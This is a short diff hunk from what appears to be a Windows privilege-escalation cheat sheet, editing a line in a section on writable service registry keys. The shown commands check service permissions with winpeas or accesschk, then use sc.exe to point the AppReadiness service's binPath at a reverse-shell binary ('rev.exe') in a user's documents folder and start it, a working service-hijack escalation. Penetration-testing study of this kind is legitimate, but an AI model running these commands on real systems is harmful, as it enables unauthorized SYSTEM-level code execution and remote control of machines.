@@ -378,7 +378,7 @@ Check Writtable Services Under Registry To Current User:
 winpeas.exe or accesschk.exe /accepteula -uvwqk  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
 ```
 ```
-sc qc AppReadiness 
+sc qc AppReadiness | PsService.exe security AppReadiness
 sc.exe config AppReadiness binPath= "C:\users\svc-printer\documents\rev.exe"
 sc start AppReadiness
 ```
